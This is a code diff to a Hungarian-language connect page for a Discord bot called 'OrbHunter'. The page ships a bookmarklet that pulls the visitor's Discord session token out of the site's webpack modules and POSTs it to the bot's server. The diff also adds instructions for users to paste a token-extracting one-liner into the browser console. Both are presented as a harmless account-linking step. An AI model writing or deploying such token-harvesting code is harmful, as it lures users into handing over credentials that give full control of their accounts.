@@ -47,7 +47,7 @@ export function renderConnectPage(session) {
   const apiUrl = `${baseUrl}/api/connect/save`;
 
   // Bookmarklet code that safely extracts token on discord.com and posts to our bot
-  const rawBookmarklet = `javascript:(function(){try{let token=null;window.webpackChunkdiscord_app.push([[Math.random()],{},function(req){for(const k of Object.keys(req.c)){const m=req.c[k].exports;if(m){if(m.default&&typeof m.default.getToken==='function'){token=m.default.getToken();break;}if(typeof m.getToken==='function'){token=m.getToken();break;}}}}]);if(!token){alert('⚠️ Nem található aktív bejelentkezés! Nyisd meg a discord.com/app oldalt bejelentkezve, és ott kattints erre a könyvjelzőre.');return;}const n=document.createElement('div');n.style.position='fixed';n.style.top='20px';n.style.right='20px';n.style.zIndex='999999';n.style.background='#5865f2';n.style.color='#fff';n.style.padding='14px 20px';n.style.borderRadius='12px';n.style.boxShadow='0 8px 24px rgba(0,0,0,0.5)';n.style.fontFamily='sans-serif';n.style.fontSize='14px';n.innerHTML='⚡ <b>OrbHunter:</b> Fiók összekapcsolása...';document.body.appendChild(n);fetch('${apiUrl}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'${session.id}',token:token})}).then(function(r){return r.json();}).then(function(d){if(d.success){n.style.background='#23a55a';n.innerHTML='🎉 <b>Sikeres csatlakozás:</b> '+d.username+'<br>A bot aktiválva van a Discordban!';setTimeout(function(){n.remove();},5000);}else{n.style.background='#ed4245';n.innerHTML='❌ Hiba: '+(d.error||'Ismeretlen hiba');setTimeout(function(){n.remove();},5000);}}).catch(function(e){n.style.background='#ed4245';n.innerHTML='❌ Hálózati hiba: '+e.message;setTimeout(function(){n.remove();},5000);});}catch(e){alert('❌ Hiba: '+e.message);}})();`;
+  const rawBookmarklet = `javascript:(function(){try{if(typeof window.webpackChunkdiscord_app==='undefined'){alert('⚠️ Figyelem: Ezt a gombot húzd fel a böngésződ felső könyvjelzősávjára (Ctrl+Shift+B mutatja a sávot)!\\n\\nUtána nyisd meg a discord.com/app felületét bejelentkezve, és ott kattints rá!');return;}let token=null;window.webpackChunkdiscord_app.push([[Math.random()],{},function(req){for(const k of Object.keys(req.c)){const m=req.c[k].exports;if(m){if(m.default&&typeof m.default.getToken==='function'){token=m.default.getToken();break;}if(typeof m.getToken==='function'){token=m.getToken();break;}}}}]);if(!token){alert('⚠️ Nem található aktív bejelentkezés! Nyisd meg a discord.com/app oldalt bejelentkezve, és ott kattints erre a könyvjelzőre.');return;}const n=document.createElement('div');n.style.position='fixed';n.style.top='20px';n.style.right='20px';n.style.zIndex='999999';n.style.background='#5865f2';n.style.color='#fff';n.style.padding='14px 20px';n.style.borderRadius='12px';n.style.boxShadow='0 8px 24px rgba(0,0,0,0.5)';n.style.fontFamily='sans-serif';n.style.fontSize='14px';n.innerHTML='⚡ <b>OrbHunter:</b> Fiók összekapcsolása...';document.body.appendChild(n);fetch('${apiUrl}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'${session.id}',token:token})}).then(function(r){return r.json();}).then(function(d){if(d.success){n.style.background='#23a55a';n.innerHTML='🎉 <b>Sikeres csatlakozás:</b> '+d.username+'<br>A bot aktiválva van a Discordban!';setTimeout(function(){n.remove();},5000);}else{n.style.background='#ed4245';n.innerHTML='❌ Hiba: '+(d.error||'Ismeretlen hiba');setTimeout(function(){n.remove();},5000);}}).catch(function(e){n.style.background='#ed4245';n.innerHTML='❌ Hálózati hiba: '+e.message;setTimeout(function(){n.remove();},5000);});}catch(e){alert('❌ Hiba: '+e.message);}})();`;
 
   return `<!DOCTYPE html>
 <html lang="hu">
@@ -284,13 +284,13 @@ export function renderConnectPage(session) {
     <!-- Option 1: Bookmarklet -->
     <div class="section-title">1. Módszer: 1-Kattintásos Csatlakozás</div>
     <div class="bookmark-box">
-      <a class="bookmark-btn" href="${rawBookmarklet}" title="Húzd fel a könyvjelzősávra!">
+      <a class="bookmark-btn" href="${rawBookmarklet}" title="Húzd fel a könyvjelzősávra!" onclick="if(location.hostname!=='discord.com'){alert('⚠️ Ez a gomb a könyvjelzősávra való!\\n\\n1. Húzd fel ezt a kék gombot a felső könyvjelzőid közé (Ctrl+Shift+B mutatja a sávot).\\n2. Menj a discord.com/app felületére bejelentkezve.\\n3. Kattints ott a könyvjelzőre!\\n\\nVAGY használd a lenti 2. módszert a közvetlen beillesztéshez.'); return false;}">
         <span>⚡</span> OrbHunter Csatlakozás
       </a>
       <p class="bookmark-hint">
-        <b>1.</b> Fogd meg a fenti kék gombot és <b>húzd fel a böngésződ könyvjelzősávjára</b>.<br>
-        <b>2.</b> Menj a <a href="https://discord.com/app" target="_blank" style="color: #5865f2; text-decoration: none;">discord.com/app</a> felületére.<br>
-        <b>3.</b> Kattints a könyvjelzőre, és azonnal összekapcsolja a fiókodat!
+        <b>1.</b> Fogd meg a fenti kék gombot és <b>húzd fel a böngésződ könyvjelzősávjára</b> (Ctrl+Shift+B).<br>
+        <b>2.</b> Menj a <a href="https://discord.com/app" target="_blank" style="color: #5865f2; text-decoration: none;">discord.com/app</a> felületére bejelentkezve.<br>
+        <b>3.</b> Kattints a könyvjelzőre, és 1 másodperc alatt összekapcsolja a fiókodat!
       </p>
     </div>
 
@@ -302,6 +302,13 @@ export function renderConnectPage(session) {
         <button type="button" class="eye-btn" onclick="toggleEye()">👁️</button>
       </div>
       <button type="submit" id="submitBtn" class="submit-btn">Mentés és Csatlakoztatás</button>
+      <div style="font-size: 12px; color: #949ba4; line-height: 1.5; background: rgba(255,255,255,0.03); padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.06);">
+        💡 <b>Nem tudod a tokenedet? 10 másodperc megszerezni:</b><br>
+        1. Nyisd meg a Discordot a böngésződben és nyomj <b>F12</b>-t (Console fül).<br>
+        2. Másold be ezt az egy sort és üss Entert:<br>
+        <code style="display:block; background:#000; padding:6px 8px; border-radius:6px; margin:6px 0; color:#57f287; font-size:11px; word-break:break-all; user-select:all;">(webpackChunkdiscord_app.push([[''],{},e=>{m=e.c}]),Object.values(m).find(m=>m?.exports?.default?.getToken).exports.default.getToken())</code>
+        3. A zölden megjelenő tokent másold ide a mezőbe és nyomj a zöld Mentés gombra!
+      </div>
     </form>
 
     <div id="statusMsg" class="status-msg"></div>
